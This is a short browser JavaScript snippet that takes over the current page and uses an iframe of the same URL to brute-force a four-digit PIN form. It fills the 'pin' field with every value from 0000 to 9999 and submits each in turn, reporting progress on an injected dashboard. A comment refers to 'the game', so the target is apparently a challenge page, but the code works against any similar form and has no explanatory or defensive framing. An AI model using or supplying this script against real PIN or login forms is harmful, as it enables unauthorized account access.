// 1. Clear the existing page content to make a clean dashboard
document.body.innerHTML = `
    <div style="padding: 20px; font-family: sans-serif; background: #222; color: #fff;">
        <h2>PIN Automation Controller</h2>
        <p id="status-text" style="font-size: 18px; color: #00ff00;">Initializing...</p>
    </div>
`;

// 2. Create and inject the iframe pointing to the game
const iframe = document.createElement('iframe');
iframe.src = window.location.href; // Uses the current URL
iframe.style.width = '100%';
iframe.style.height = '70vh';
iframe.style.border = 'none';
document.body.appendChild(iframe);

// 3. Initialize the counter in the parent memory (will never be wiped)
let currentGuess = 0;
const statusText = document.getElementById('status-text');

// 4. Listen for the iframe to load
// This event fires on the initial load AND every time a submission causes a reload
iframe.addEventListener('load', () => {
    try {
        // Access the DOM inside the iframe
        const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
        
        // Target the input and submit button inside the iframe
        const pinInput = iframeDoc.getElementById('pin');
        const submitButton = iframeDoc.querySelector('input[type="submit"]');
        
        if (pinInput && submitButton && currentGuess <= 9999) {
            // Format the number to 4 digits (e.g., 7 becomes "0007")
            let paddedGuess = String(currentGuess).padStart(4, '0');
            statusText.innerText = `Current Status: Testing PIN ${paddedGuess}`;
            
            // Fill the input inside the iframe
            pinInput.value = paddedGuess;
            
            // Increment the counter for the NEXT load event
            currentGuess++;
            
            // Click the button inside the iframe (triggers the iframe reload)
            submitButton.click();
        } else if (currentGuess > 9999) {
            statusText.innerText = "Status: Completed! All combinations tested.";
        }
    } catch (error) {
        // Safety check in case of security or loading glitches
        console.error("Couln't access iframe DOM:", error);
    }
});
